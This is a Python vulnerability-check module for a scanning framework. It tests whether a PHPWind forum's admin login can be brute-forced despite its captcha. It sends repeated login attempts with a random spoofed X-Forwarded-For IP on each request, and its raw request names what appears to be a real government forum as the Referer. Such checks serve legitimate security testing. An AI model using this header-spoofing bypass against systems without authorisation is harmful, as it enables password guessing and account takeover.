# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import random
import urllib.parse


class Vuln(ABVuln):
    vuln_id = 'PHPWind_0012'  # 平台漏洞编号，留空
    name = 'PHPWind 后台可爆破'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.OTHER  # 漏洞类型
    disclosure_date = '2014-10-22'  # 漏洞公布时间
    desc = '''
        phpwind（简称：pw）是一个基于PHP和MySQL的开源社区程序，是国内最受欢迎的通用型论坛程序之一。
        PHPWind 后台帐号密码可爆破无视验证码。
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=080327'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'PHPWind'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '3074078a-7da9-4c05-873a-204843a81d77'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-07'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # http://www.wooyun.org/bugs/wooyun-2010-080327
            hh = hackhttp.hackhttp()
            #host = re.findall('http://(.*)/$', self.target)[0]
            host = urllib.parse.urlparse(self.target).hostname
            t = 0
            for i in range(20):
                ip = str(random.randint(100, 244))+"."+str(random.randint(100, 244)) + \
                    "."+str(random.randint(100, 244))+"." + \
                    str(random.randint(100, 244))
                raw = '''
POST /windid/admin.php?a=login HTTP/1.1
Host: %s
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:18.0) Gecko/20100101 Firefox/18.0
X-Forwarded-For: %s
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: http://bbs.typhoon.gov.cn/windid/admin.php
Cookie: csrf_token=efb7ee93681c6148
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 57

username=1&password=1&submit=&csrf_token=efb7ee93681c6148
                ''' % (host, ip)
                code, head, body, errcode, log = hh.http(
                    self.target + '/windid/admin.php?a=login', raw=raw)
                if '账号或密码错误，请重新登录' in body:
                    t += 1
                if i > 3 and t == 0:
                    return
            if t >= 10:
                #security_warning(url + 'windid/admin.php' + ' : Brute-force cracking');
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
